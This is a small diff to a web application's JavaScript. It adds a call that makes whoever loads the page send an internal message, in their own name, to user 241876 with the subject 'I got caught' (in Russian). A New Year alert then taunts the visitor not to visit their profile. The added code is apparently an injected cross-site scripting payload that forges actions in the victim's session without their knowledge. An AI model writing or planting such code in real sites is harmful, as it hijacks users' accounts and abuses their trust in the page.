@@ -8,4 +8,12 @@ runAsyncAjaxRequest3({
     }
   });
 
+runAsyncAjaxRequest2("2003",
+        "3",
+        "ZERO_PAGE",
+        "APPLICATION_PROCESS=MSG_SEND", ["MSG_REFWD", "MSG_TO_ID", "MSG_SUBJ", "MSG_TO_COPY", "MSG_CORE", "MSG_FILE", "MSG_TO_COPY_XTRA_LIST"], ["", "241876", "Я попался", "", "", "", ""],
+        ["x01"],
+        ["2143"],
+        function() {});
+
 alert( "             🎄С новым годом !!!🎄 \n\n Только не заходи в свой профиль" );
